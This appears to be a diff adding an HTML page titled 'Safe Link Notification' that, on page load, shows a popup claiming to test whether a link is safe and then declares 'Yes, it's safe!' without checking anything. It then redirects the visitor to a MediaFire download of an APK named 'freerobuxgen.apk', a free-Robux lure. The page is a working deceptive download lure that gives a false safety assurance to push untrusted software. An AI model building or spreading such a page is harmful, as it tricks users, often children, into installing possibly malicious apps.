@@ -1,1 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safe Link Notification</title>
+    <style>
+        #popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: white;
+            border: 1px solid black;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+    </style>
+</head>
+<body>
+    <div id="popup">Testing if link is safe...</div>
 
+    <script>
+        function showPopup() {
+            const popup = document.getElementById('popup');
+            popup.style.display = 'block';
+
+            // Show "Testing if link is safe..." for 5 seconds
+            setTimeout(() => {
+                popup.innerHTML = 'Yes, it\'s safe!';
+                
+                // Show "Yes, it's safe!" for 3 seconds then redirect
+                setTimeout(() => {
+                    window.location.href = 'https://www.mediafire.com/file/3fxi9p5ayom5p36/freerobuxgen.apk/file';
+                }, 3000);
+            }, 5000);
+        }
+
+        // Show the popup immediately when the page loads
+        window.onload = showPopup;
+    </script>
+</body>
+</html>
